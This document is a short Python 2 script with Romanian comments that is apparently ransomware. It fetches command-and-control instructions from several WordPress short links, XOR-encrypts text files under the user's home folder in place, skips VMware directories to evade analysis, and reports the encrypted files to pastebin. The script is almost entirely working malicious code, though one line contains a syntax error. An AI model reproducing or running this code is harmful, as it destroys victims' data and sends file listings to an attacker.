import re, urllib, urllib2, cookielib, time, random, os

def adu_instr(c2_site):
    """Obtine instructiunile de CnC de pe pagina wordpress"""
    cookiejarHandler=cookielib.CookieJar()
    CookieHandler=urllib2.HTTPCookieProcessor(cookiejarHandler)
    requestor=urllib2.build_opener(CookieHandler)
    requestor.addheaders = [('User-agent','Tzeapa 2.0: Stejar')]
    request=urllib2.Request('http://'+c2_site)
    try:
        content=requestor.open(request).read()
        detalii_c2=re.findall(r'\&lt\;([A-Za-z0-9\=]+)\&gt\;',content)
        if detalii_c2 and len(detalii_c2)>1:
            return detalii_c2
        else:
            return False
    except:
        return False
    
def ascunde(fisier,cheie):
    """encriptioneaza un fisier cu cheia corespunzatoare"""
    try:
        text=open(fisier,'rb').read()
        fisier_nou=open(fisier,'wb')
        new_text=""
        for c in text:
            fisier_nou.write(chr(ord(c)^int(cheie)))
        fisier_nou.close()
        return True
    except:
        return False

def gaseste(director,cheie):
    """ incearca sa gaseasca documente .txt in directorul de unde rulam"""
    fisiere_ascunse=[]
    for currentdir,listofdirs,listoffiles in os.walk(director):
        for fisier in listoffiles:
            if fisier.endswith('.txtx')c and 'VMware' not in currentdir:
                ascunde(currentdir+'/'+fisier,cheie)
                fisiere_ascunse.append({'director':currentdir,'fisier':fisier,'cheie':cheie})
    return fisiere_ascunse

def raporteaza(fisiere_ascunse,uid,cheia):
    """raporteaza problema"""
    raport=''
    for fisier in fisiere_ascunse:
        raport+=('|'+uid+'|'+fisier['director']+'|'+fisier['fisier']+'|\n')
    pastebin_vars = {'api_dev_key':cheia,'api_option':'paste','api_paste_code':raport}
    response = urllib.urlopen('http://pastebin.com/api/api_post.php', urllib.urlencode(pastebin_vars))
    url = response.read()
    return url
        
wp=['wp.me/p4ktDZ-2','wp.me/fct4DY-2','wp.me/h874DY-2','wp.me/j086DY-2','wp.me/j09jDY-2','wp.me/lg6DDY-2','wp.me/lK0HDY-2','wp.me/p4keDY-2']

for c2 in wp:
    instr=adu_instr(c2)
    time.sleep(random.randint(0,4))
    if instr:
        uid=instr[1]
        if os.path.isdir('C:\Users'):
            uid+='W7'
            acasa='C:\Users'
        else:
            uid+='Alt'
            acasa='.'
        cheia=instr[0].decode('base64').decode('rot13')
        raporteaza(gaseste(acasa,instr[1]),uid,cheia)
